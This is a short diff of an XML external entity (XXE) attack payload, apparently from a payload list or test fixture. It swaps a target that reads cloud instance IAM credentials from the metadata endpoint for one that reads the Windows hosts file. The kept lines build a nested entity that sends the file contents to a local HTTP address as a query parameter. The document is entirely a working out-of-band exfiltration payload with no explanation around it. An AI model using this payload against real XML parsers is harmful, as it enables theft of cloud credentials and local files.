@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+<!ENTITY % file SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
 <!ENTITY % eval "<!ENTITY &#x25; ssrf SYSTEM 'http://127.0.0.1:80/?data=%file;'>">
 %eval;
 %ssrf;
